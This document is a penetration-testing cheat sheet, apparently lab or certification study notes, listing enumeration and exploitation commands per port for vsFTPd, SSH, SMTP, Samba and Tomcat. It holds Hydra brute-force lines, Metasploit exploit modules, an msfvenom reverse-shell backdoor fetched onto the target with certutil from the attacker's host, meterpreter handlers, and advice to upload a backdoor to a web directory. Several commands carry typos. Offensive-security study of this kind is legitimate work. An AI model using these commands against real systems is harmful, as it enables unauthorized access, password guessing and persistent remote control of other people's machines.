# Linux - Enum/Exploitation

## 21 - vsFTPd

```bash
# CHECK THE VERSION
searchsploit vsftpd VERSION
```

### vsFTPd enumeration

{% code title="Enumeration" %}
```bash
# Nmap
nmap -sV -sC -p 21 IP

# NMAP scripts
ls -la /usr/share/nmap/scripts/ | grep ftp-
nmap -sV -p 21 --script SCRIPT IP
```
{% endcode %}

{% code title="Metasploit enumeration" %}
```bash
service postgresql start && msfconsole

search type:auxiliary name:ftp

use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/ftp_version
```
{% endcode %}

### vsFTPd exploit

{% code title="Brute-force" %}
```bash
# if there is a smtp service we can enum this for find username.
hydra -l USER -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt IP ftp -I
```
{% endcode %}

{% code title="Manual Exploit " %}
```bash
# Connection with anonymous
ftp IP PORT
anonymous
anonymous

# Search Exploit
searchsploit vsftpd 2.3.4
## copy the exploit in cur dir
searchsploit -m EXPLOIT_ID
```
{% endcode %}

{% code title="Metasploit" %}
```bash
service postgresql start && msfconsole

## VSFTPD 2.3.4 Backdoor Command Execution
use esploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS IP
exploit
```
{% endcode %}

#### Scope

* Check if we are access to a web directory. Upload a backdoor and we are in!

## 22 - SSH

```
# CHECK THE VERSION
searchsploit ssh VERSION
```

### SSH enumeration

```bash
# Nmap enum
nmap -sV -sC -p 22 IP

nmap -p 22 --script ssh2-enum-algos IP
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full IP
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=USER" IP

nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=USER, ssh-run.password=PASS" <TARGET_IP>

nmap -p 22 --script=ssh-brute --script-args userdb=USERS IP
```

{% code title="Metasploit Enumeration" %}
```bash
service postgresql start && msfconsole

search type:auxiliary name:ssh

use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers
use auxiliary/scanner/ssh/ssh_login
```
{% endcode %}

### SSH exploit

```bash
# Search exploit for current version
searchspoilt OpenSSH 7.1

# Hydra SSH Brute-forcing
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh -I
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh -I
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt IP ssh -I

# SSH connection with creds
ssh USER@IP
PASS
```

{% code title="Metasploit" %}
```bash
service postgresql start && msfconsole

## Access or brute forcing with msfconsole
use auxiliary/scanner/ssh/ssh_login

set RHOSTS IP
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```
{% endcode %}

## 25 - SMTP

```
# CHECK THE VERSION
searchsploit smtp VERSION
```

### SMTP enumeration

```bash
# Nmap
nmap -p 25 -sV -sC -O <TARGET_IP>
nmap -sV -script banner <TARGET_IP>
```

### SMTP exploit

{% code title="Metasploit" %}
```bash
service postgresql start && msfconsole

## stmp enumeration
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS IP
run
```
{% endcode %}

### SMTP Server Haraka 2.8.9

```bash
service postgresql start && msfconsole

use exploit/linux/smtp/haraka
set RHOST IP
set SRVPORT PORT
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set LHOST IP
exploit
```

## 80/443 - HTTP/S

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

## 445 - SAMBA

```
# CHECK THE VERSION
searchsploit samba VERSION
```

### SAMBA enumeration

```bash
nmap -sV -p 445 IP
nc -nv IP PORT

## NMAP Scripts
nmap -p 445 --script smb-protocols IP
nmap -p 445 --script smb-security-mode IP
nmap -p 445 --script smb-enum-sessions IP
nmap -p 445 --script smb-enum-sessions --script-args smbusername=USER,smbpassword=PW IP
nmap -p 445 --script smb-enum-shares IP
nmap -p 445 --script smb-enum-shares --script-args smbusername=USER,smbpassword=PASS IP
nmap -p 445 --script smb-enum-users --script-args smbusername=USER,smbpassword=PASS IP
nmap -p 445 --script smb-server-stats --script-args smbusername=USER,smbpassword=PASS IP
nmap -p 445 --script smb-enum-domains--script-args smbusername=USER,smbpassword=PASS IP
nmap -p 445 --script smb-enum-groups--script-args smbusername=USER,smbpassword=PASS IP
nmap -p 445 --script smb-enum-services --script-args smbusername=USER,smbpassword=PASS IP
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=USER,smbpassword=PASS IP
nmap -p 445 --script smb-os-discovery IP
nmblookup -A IP
```

{% code title="Hydra Brute-Force" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt$IP smb
```
{% endcode %}

{% code title="Metasploit enumeration" %}
```bash
service postgresql start && msfconsole

search type:auxiliary name:smb

use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
```
{% endcode %}

```bash
# list of directories
smbmap -H IP -u USER -p PASS

# navigate in share folders | download file
smbclient //IP/FOLDER_NAME -U USER
get FILE

# enum4linux
enum4linux -a -u USER -p PASS IP
```

### SAMBA exploit

<pre class="language-bash"><code class="lang-bash"><strong># Vuln version 3.0.20
</strong><strong>
</strong><strong># Search vuln version
</strong>## Searchsploit
searchsploit samba 3.0.20

## Metasploit
search samba 3.0.20
use exploit/multi/samba/usermap_script
show info
set RHOSTS IP
exploit
</code></pre>

```bash
# Vuln version 3.5.0 to 4.4.14, 4.5.10 and 4.6.4
use exploit/linux/samba/is_known_pipename
set RHOSTS IP
exploit
```

## 8080

```
# CHECK THE VERSION
searchsploit SERVICE VERSION
```

### Apache Tomcat

#### Tomcat 8.5.19

```bash
service postgresql start && msconsole

use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOST
set payload java/jsp_shell_bind_tcp
set SHELL cmd
run

# Persistence Payload
# create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe

# transfer payload
python -m SimpleHTTP 80 # attack machine
certutil -urlcache -f http://IP_ATT/backdoor.exe backdoor.exe # target machine

# set handler
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
run

# execute payload on target machine
.\backdoor.exe
```

#### Tomcat Manager Authenticates Upload Code Execution

```bash
service postgresql start && msfconsole
use exploit/multi/http/tomcat_mgr_upload
set TARGET 2
set HttpPassword s3cret
set HttpUsername tomcat
set RHOSTS IP
set RPORT IP
set LHOST IP
set Payload linux/x86/shell/reverse_tcp
exploit
```
